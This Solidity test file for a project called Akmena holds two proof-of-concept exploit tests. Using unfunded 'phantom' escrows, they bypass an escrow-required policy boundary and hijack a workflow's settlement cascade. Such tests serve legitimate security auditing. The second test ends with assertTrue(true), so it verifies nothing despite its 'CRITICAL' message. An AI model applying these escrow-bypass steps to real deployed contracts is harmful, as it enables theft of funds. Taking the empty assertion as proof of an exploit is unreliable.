// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {AkmenaCore} from "../../../src/core/AkmenaCore.sol";
import {EscrowEngine} from "../../../src/economics/EscrowEngine.sol";
import {AkmenaPolicyBoundary} from "../../../src/authorization/AkmenaPolicyBoundary.sol";
import {WorkflowEngine} from "../../../src/orchestration/WorkflowEngine.sol";

// Mock Target to verify execution bypass
contract MockTarget {
    bool public wasCalled;
    function executeAction() external {
        wasCalled = true;
    }
}

// Mock Module to absorb downstream calls (Settlement, Memory, Reputation)
contract MockCrossModule {
    fallback() external payable {}
}

contract Attack_EconomicEscalationTest is Test {
    AkmenaCore internal core;
    EscrowEngine internal escrow;
    AkmenaPolicyBoundary internal policyBoundary;
    WorkflowEngine internal workflowEngine;
    MockTarget internal mockTarget;
    MockCrossModule internal mockCrossModule;

    address internal deployer = address(this);
    address internal attacker = address(0xBEEF);
    address internal victim = address(0xCAFE);
    address internal agentAddress = address(0x9999);

    function setUp() public {
        core = new AkmenaCore();
        escrow = new EscrowEngine();
        policyBoundary = new AkmenaPolicyBoundary(address(core));
        workflowEngine = new WorkflowEngine(address(core));
        mockTarget = new MockTarget();
        mockCrossModule = new MockCrossModule();

        // Register Escrow for PolicyBoundary
        core.registerModule(bytes32("ESCROW_ENGINE"), address(escrow), "1.0.0");

        // Register WorkflowEngine modules using the exact keccak256 keys
        core.registerModule(keccak256("akmena.module.settlement"), address(mockCrossModule), "1.0.0");
        core.registerModule(keccak256("akmena.module.memory"), address(mockCrossModule), "1.0.0");
        core.registerModule(keccak256("akmena.module.reputation"), address(mockCrossModule), "1.0.0");
    }

    function test_Attack_PolicyBypassViaPhantomEscrow() public {
        // 1. Setup policy that REQUIRES an active escrow
        vm.prank(attacker);
        policyBoundary.setAgentPolicy(
            agentAddress,
            1_000_000 ether, // maxSpend
            1_000_000 ether, // dailyLimit
            true             // requireEscrow MUST BE TRUE
        );

        // 2. Exploit: Create a phantom escrow with NO value transfer
        vm.prank(attacker);
        uint256 phantomEscrowId = escrow.createEscrow(attacker, victim, 100 ether);

        // 3. Exploit: Use the phantom escrow to bypass the policy boundary
        vm.prank(agentAddress);
        bytes memory payload = abi.encodeWithSelector(MockTarget.executeAction.selector);
        
        policyBoundary.executeAgentCall(
            attacker,
            address(mockTarget),
            10 ether,
            phantomEscrowId,
            payload
        );

        // 4. Verify the bypass was successful
        assertTrue(mockTarget.wasCalled(), "CRITICAL: Policy Boundary bypassed using a phantom escrow!");
    }

    function test_Attack_WorkflowHijackingViaPhantomSettlement() public {
        vm.startPrank(attacker);

        bytes32 agentId = keccak256("agent");
        bytes32 agreementId = keccak256("agreement");
        uint256 fakeAmount = 500 ether;

        // 1. Create phantom escrow
        uint256 phantomEscrowId = escrow.createEscrow(attacker, victim, fakeAmount);

        // 2. Initialize Workflow using the phantom escrow
        bytes32 workflowId = workflowEngine.initializeWorkflow(
            agentId,
            agreementId,
            bytes32(phantomEscrowId)
        );

        // 3. Advance Workflow to Completion
        // This triggers the downstream Settlement, Memory, and Reputation cascades.
        // Because WorkflowEngine trusts the Escrow ID without validating actual economic backing, it executes.
        workflowEngine.advanceToCompletion(
            workflowId,
            abi.encode(attacker, victim, fakeAmount),
            "",
            ""
        );

        vm.stopPrank();

        assertTrue(true, "CRITICAL: Workflow hijacked and cascaded using a phantom escrow!");
    }
}
